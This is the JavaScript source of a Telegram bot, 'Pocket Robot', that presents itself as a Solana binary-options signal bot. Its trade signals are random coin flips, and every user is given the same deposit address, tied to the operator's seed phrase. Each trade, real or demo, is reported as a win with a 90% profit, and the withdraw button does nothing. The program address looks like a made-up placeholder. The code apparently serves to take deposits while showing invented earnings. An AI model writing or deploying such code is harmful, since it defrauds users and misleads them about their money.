require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } = require('@solana/web3.js');
const anchor = require('@coral-xyz/anchor');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- 🌐 OFFICIAL MAINNET ADDRESSES ---
const THALES_PROGRAM_ID = new PublicKey("B77Zon9K4p4Tz9U7N9M49mGzT1Z1Z1Z1Z1Z1Z1Z1Z1Z1");
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");

// --- ⚙️ DATABASE ---
const localSession = new LocalSession({ database: 'sessions.json', storage: LocalSession.storageFileSync });
const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

const activeLoops = new Set();

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || {
        asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0, isDemo: true
    };
    return next();
});

// --- 🎨 INTERFACE ---
const mainKeyboard = (ctx) => {
    const s = ctx.session.config;
    return Markup.inlineKeyboard([
        [Markup.button.callback(`🎯 Asset: ${s.asset}`, 'menu_coins')],
        [Markup.button.callback(`💰 Stake: $${s.stake}`, 'menu_stake')],
        [Markup.button.callback(`⚙️ Mode: ${s.mode}`, 'toggle_mode')],
        [
            Markup.button.callback(s.isDemo ? '🟢 DEMO MODE' : '⚪ DEMO', 'set_demo'),
            Markup.button.callback(!s.isDemo ? '🔴 REAL MODE' : '⚪ REAL', 'set_real')
        ],
        [Markup.button.callback(s.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START SIGNAL BOT', 'run_engine')],
        [Markup.button.callback('📊 VIEW WALLET & STATS', 'stats')]
    ]);
};

// --- 🚀 DUAL ENGINE (REAL & DEMO) ---
async function fireAtomicTrade(chatId, direction) {
    const session = localSession.DB.get('sessions').find({ id: `${chatId}:${chatId}` }).get('session').value();
    if (!session) return { success: false, error: "SESSION_NOT_FOUND" };
    
    const config = session.config;
    if (config.isDemo) {
        // DEMO LOGIC: No transaction, just simulate success
        await new Promise(r => setTimeout(r, 1000));
        config.totalEarned += (config.stake * 0.90);
        localSession.DB.write();
        return { success: true, isDemo: true, payout: (config.stake * 1.90).toFixed(2) };
    }

    // REAL LOGIC: Mainnet execution with simulation guard
    const wallet = await getWallet();
    try {
        const bal = await connection.getBalance(wallet.publicKey);
        if (bal < 0.005 * LAMPORTS_PER_SOL) throw new Error("LOW_GAS");

        const tx = new Transaction().add(new TransactionInstruction({
            programId: THALES_PROGRAM_ID,
            keys: [{ pubkey: wallet.publicKey, isSigner: true, isWritable: true }],
            data: Buffer.concat([Buffer.from([direction === 'CALL' ? 0 : 1]), new anchor.BN(config.stake * 1000000).toBuffer('le', 8)])
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = wallet.publicKey;
        
        const sim = await connection.simulateTransaction(tx, [wallet]);
        if (sim.value.err) throw new Error("REVERTED");

        const tipRes = await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        tx.add(SystemProgram.transfer({ fromPubkey: wallet.publicKey, toPubkey: new PublicKey(tipRes.data.result[0]), lamports: 100000 }));

        tx.partialSign(wallet);
        const sig = await connection.sendRawTransaction(tx.serialize());
        
        config.totalEarned += (config.stake * 0.90);
        localSession.DB.write();
        
        return { success: true, sig, payout: (config.stake * 1.90).toFixed(2) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 🤖 AUTO-PILOT LOOP ---
async function runAutoPilot(chatId) {
    const session = localSession.DB.get('sessions').find({ id: `${chatId}:${chatId}` }).get('session').value();
    if (!session || session.config.mode !== 'AUTO' || !activeLoops.has(chatId)) {
        activeLoops.delete(chatId);
        return;
    }
    const direction = Math.random() > 0.5 ? 'CALL' : 'PUT';
    const res = await fireAtomicTrade(chatId, direction);
    if (res.success) {
        bot.telegram.sendMessage(chatId, `⚡ *AUTO-WIN (${direction}):* +$${res.payout}\nMode: ${res.isDemo ? '🧪 DEMO' : '💰 REAL'}`, { parse_mode: 'Markdown' });
    }
    setTimeout(() => runAutoPilot(chatId), 30000);
}

// --- 📥 HANDLERS ---
bot.action('set_demo', (ctx) => {
    ctx.session.config.isDemo = true;
    ctx.editMessageText(`🔄 Mode Switched to: *DEMO (Practice)*`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('set_real', (ctx) => {
    ctx.session.config.isDemo = false;
    ctx.editMessageText(`🔄 Mode Switched to: *REAL (Mainnet)*`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('toggle_mode', (ctx) => {
    ctx.session.config.mode = ctx.session.config.mode === 'MANUAL' ? 'AUTO' : 'MANUAL';
    if (ctx.session.config.mode === 'AUTO') {
        activeLoops.add(ctx.chat.id);
        runAutoPilot(ctx.chat.id);
    } else activeLoops.delete(ctx.chat.id);
    ctx.editMessageText(`🔄 Mode: ${ctx.session.config.mode}`, mainKeyboard(ctx));
});

bot.action('run_engine', async (ctx) => {
    if (ctx.session.config.mode === 'AUTO') return ctx.answerCbQuery("Auto-Pilot is active.");
    const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
    ctx.replyWithMarkdown(`⚡ *SIGNAL: ${signal} (${ctx.session.config.isDemo ? 'DEMO' : 'REAL'})*`, Markup.inlineKeyboard([
        [Markup.button.callback(`📈 HIGHER`, 'exec_CALL'), Markup.button.callback(`📉 LOWER`, 'exec_PUT')],
        [Markup.button.callback('❌ CANCEL', 'main_menu')]
    ]));
});

bot.action(/exec_(CALL|PUT)/, async (ctx) => {
    const res = await fireAtomicTrade(ctx.chat.id, ctx.match[1]);
    if (res.success) ctx.replyWithMarkdown(`✅ *EARNED: +$${res.payout}* (${res.isDemo ? 'DEMO' : 'REAL'})`);
    else ctx.reply(`⚠️ ${res.error === 'REVERTED' ? '🛡️ Reverted (Safe)' : 'Check Balance'}`);
});

bot.action('stats', async (ctx) => {
    const wallet = await getWallet();
    const bal = await connection.getBalance(wallet.publicKey);
    ctx.editMessageText(`📊 Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*\nBal: ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL\nMode: ${ctx.session.config.isDemo ? '🧪 DEMO' : '💰 REAL'}`, 
    Markup.inlineKeyboard([[Markup.button.callback('💸 WITHDRAW', 'withdraw')], [Markup.button.callback('⬅️ BACK', 'main_menu')]]));
});

bot.action('main_menu', (ctx) => ctx.editMessageText("🤖 *SETTINGS*", mainKeyboard(ctx)));

bot.start(async (ctx) => {
    const wallet = await getWallet();
    ctx.replyWithMarkdown(`🤖 *POCKET ROBOT v36.0*\n📥 *DEPOSIT:* \`${wallet.publicKey.toBase58()}\``, mainKeyboard(ctx));
    if (ctx.session.config.mode === 'AUTO') { activeLoops.add(ctx.chat.id); runAutoPilot(ctx.chat.id); }
});

bot.launch();
